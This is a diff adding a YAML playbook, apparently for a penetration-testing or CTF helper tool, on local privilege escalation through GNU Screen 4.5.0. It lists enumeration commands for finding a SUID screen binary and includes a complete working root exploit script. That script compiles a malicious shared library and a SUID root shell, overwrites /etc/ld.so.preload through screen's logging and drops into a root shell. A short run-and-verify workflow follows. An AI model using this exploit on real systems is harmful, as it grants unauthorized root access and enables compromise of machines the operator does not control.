@@ -1,0 +1,128 @@
+name: GNU Screen 4.5.0 Privilege Escalation
+
+steps:
+
+# =========================================================
+# [1] ENUMERATE SCREEN
+# =========================================================
+- title: Enumerate Screen
+  mode: enum
+  info: |
+    Identify vulnerable GNU Screen installations.
+
+  entries:
+
+    - cmd: "screen -v"
+      info: screen version
+
+    - cmd: "find / -perm -4000 -name screen 2>/dev/null"
+      info: SUID screen binary
+
+    - cmd: "ls -la $(which screen)"
+      info: inspect permissions
+
+  look_for:
+    - "Screen version 4.05.00"
+    - SUID bit
+    - root-owned screen binary
+
+  notes:
+    - GNU Screen 4.5.0 is vulnerable
+    - vulnerable versions may allow root escalation
+    - exploit abuses ld.so.preload
+
+
+# =========================================================
+# [2] SCREEN 4.5.0 EXPLOIT
+# =========================================================
+- title: Screen 4.5.0 Exploit
+  mode: script
+
+  info: |
+    GNU Screen 4.5.0 SUID root exploit.
+
+  filename: screenroot.sh
+
+  script: |
+    #!/bin/bash
+    # screenroot.sh
+    # setuid screen v4.5.0 local root exploit
+    # abuses ld.so.preload overwriting to get root.
+
+    echo "~ gnu/screenroot ~"
+
+    cat << EOF > /tmp/libhax.c
+    #include <stdio.h>
+    #include <sys/types.h>
+    #include <unistd.h>
+    #include <sys/stat.h>
+
+    __attribute__ ((__constructor__))
+    void dropshell(void){
+        chown("/tmp/rootshell", 0, 0);
+        chmod("/tmp/rootshell", 04755);
+        unlink("/etc/ld.so.preload");
+        printf("[+] done!\n");
+    }
+    EOF
+
+    gcc -fPIC -shared -ldl -o /tmp/libhax.so /tmp/libhax.c
+
+    rm -f /tmp/libhax.c
+
+    cat << EOF > /tmp/rootshell.c
+    #include <stdio.h>
+
+    int main(void){
+        setuid(0);
+        setgid(0);
+        seteuid(0);
+        setegid(0);
+        execvp("/bin/sh", NULL, NULL);
+    }
+    EOF
+
+    gcc -o /tmp/rootshell /tmp/rootshell.c -Wno-implicit-function-declaration
+
+    rm -f /tmp/rootshell.c
+
+    cd /etc
+
+    umask 000
+
+    screen -D -m -L ld.so.preload echo -ne "\x0a/tmp/libhax.so"
+
+    screen -ls
+
+    /tmp/rootshell
+
+# =========================================================
+# [3] QUICK WORKFLOW
+# =========================================================
+- title: Quick Workflow
+  mode: chain
+  info: |
+    Minimal Screen 4.5.0 exploitation workflow.
+
+  entries:
+
+    - cmd: "screen -v"
+      info: confirm vulnerable version
+
+    - cmd: "find / -perm -4000 -name screen 2>/dev/null"
+      info: verify SUID
+
+    - cmd: "./screen_exploit.sh"
+      info: run exploit
+
+    - cmd: "id"
+      info: verify root
+
+  look_for:
+    - vulnerable version
+    - SUID screen
+    - uid=0
+
+  notes:
+    - fastest path during CTFs
+    - use manual workflow if exploit script unavailable
